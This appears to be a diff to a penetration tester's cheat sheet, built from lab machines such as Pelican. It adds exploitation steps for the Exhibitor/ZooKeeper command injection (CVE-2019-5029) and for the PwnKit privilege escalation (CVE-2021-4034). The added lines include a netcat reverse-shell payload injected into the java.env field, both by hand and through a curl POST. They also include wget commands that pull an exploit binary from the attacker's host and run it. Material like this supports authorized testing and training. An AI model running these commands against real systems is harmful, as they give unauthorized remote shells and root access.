@@ -605,6 +605,8 @@ nmap -p <PORT> -sC -sV --version-intensity 9 $ip
 # 9200/9300     — Elasticsearch
 # 6379          — Redis
 # 27017         — MongoDB
+# 2181          — Zookeeper → look for Exhibitor UI on 8080/8081 → CVE-2019-5029
+# 8080/8081     — Exhibitor Web UI (no auth) → command injection → shell
 # 17001         — MS .NET Remoting (SmarterMail RCE — CVE-2019-7214)
 # GoAhead-Webs  — Embedded/industrial mgmt software → old CVEs → searchsploit
 #                 HP Power Manager: admin:admin → buffer overflow → SYSTEM
@@ -4762,6 +4764,25 @@ searchsploit hp power manager
 searchsploit smartermail
 # python3 49216.py  (edit HOST, PORT=17001, LHOST, LPORT)
 
+# ── ZOOKEEPER + EXHIBITOR (2181 / 8080 / 8081) ──────
+# Zookeeper on 2181 = look for Exhibitor Web UI on 8080/8081
+# Exhibitor = ZooKeeper supervisor with NO AUTHENTICATION by default
+# nmap: http-title redirect to /exhibitor/v1/ui/index.html = vulnerable
+# CVE-2019-5029 — command injection via java.env script field
+# Affects all versions — no auth + no input validation
+# Lab validated: Pelican (PG Play)
+
+# Manual exploit (browser):
+# 1. Browse to http://$ip:8080/exhibitor/v1/ui/index.html
+# 2. Config tab → flip Editing to ON
+# 3. java.env script field → enter: $(/bin/nc -e /bin/sh $lhost $lport &)
+# 4. Commit → All At Once → OK → wait up to 1 minute
+
+# curl exploit:
+# curl -X POST -d @data.json http://$ip:8080/exhibitor/v1/config/set
+# data.json: {"javaEnvironment":"$(/bin/nc -e /bin/sh $lhost $lport &)",...}
+# Port may be 8081 (nginx proxy) or 8080 (direct) — try both
+
 # ── SNMP — community string brute + walk
 # snmp-check dumps FULL process list — confirms what's actually running
 # Lab: ClamAV box — snmp-check confirmed clamav-milter + inetd before exploit
@@ -6198,10 +6219,20 @@ chmod +x /tmp/les.sh && /tmp/les.sh
 
 # ── PWNKIT (CVE-2021-4034) — VERY RELIABLE ────────────
 # Works on all major distros regardless of kernel version
-# Check if pkexec exists:
+# Affects pkexec < 0.120 — check version:
 which pkexec
-ls -la /usr/bin/pkexec   # should have SUID
-# Exploit: github.com/berdav/CVE-2021-4034
+pkexec --version
+ls -la /usr/bin/pkexec   # should have SUID bit
+# 0.105 = vulnerable (lab validated: Pelican)
+# LinPEAS flags this clearly — RED/YELLOW on pkexec
+
+# Precompiled binary (easiest):
+wget http://$lhost/PwnKit -O /tmp/PwnKit
+chmod +x /tmp/PwnKit && /tmp/PwnKit
+# github.com/ly4k/PwnKit — reliable precompiled version
+
+# Source compile version:
+# github.com/berdav/CVE-2021-4034
 wget http://$lhost/pwnkit -O /tmp/pw
 chmod +x /tmp/pw && /tmp/pw`,
     warn: "Kernel exploits can crash the system — always test on a clone first. Match BOTH kernel version AND distro. Mismatched exploit = kernel panic = system down = angry client.",
